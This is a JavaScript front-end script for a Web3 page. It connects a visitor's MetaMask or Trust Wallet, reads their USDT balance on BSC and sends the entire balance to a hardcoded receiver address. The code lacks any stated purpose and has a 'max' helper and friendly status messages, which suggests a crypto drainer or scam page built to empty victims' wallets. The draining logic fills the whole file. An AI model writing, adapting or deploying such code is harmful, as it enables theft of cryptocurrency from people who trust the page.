const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
const usdtABI = [
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
    "name": "transfer",
    "outputs": [{"name": "success", "type": "bool"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{"name": "", "type": "uint8"}],
    "type": "function"
  }
];

let web3;
let account;
let usdt;

window.onload = async () => {
  if (typeof window.ethereum !== 'undefined') {
    web3 = new Web3(window.ethereum);
    usdt = new web3.eth.Contract(usdtABI, usdtAddress);
  } else {
    document.getElementById("status").innerText = "Please install MetaMask or Trust Wallet.";
  }
};

async function connectWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
  account = accounts[0];
  return account;
}

async function getUSDTBalance() {
  const balance = await usdt.methods.balanceOf(account).call();
  const decimals = await usdt.methods.decimals().call();
  const humanReadable = web3.utils.fromWei(balance, 'ether');
  return { raw: balance, display: humanReadable };
}

async function setMax() {
  await connectWallet();
  const { display } = await getUSDTBalance();
  document.getElementById("usdtAmount").value = display;
}

async function transferMaxUSDT() {
  try {
    document.getElementById("status").innerText = "Connecting wallet...";
    await connectWallet();
    const { raw } = await getUSDTBalance();

    if (raw === "0") {
      document.getElementById("status").innerText = "No USDT available.";
      return;
    }

    document.getElementById("status").innerText = "Sending USDT...";
    await usdt.methods.transfer(receiver, raw).send({ from: account });

    document.getElementById("status").innerText = "✅ USDT sent successfully!";
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "❌ Error: " + err.message;
  }
}
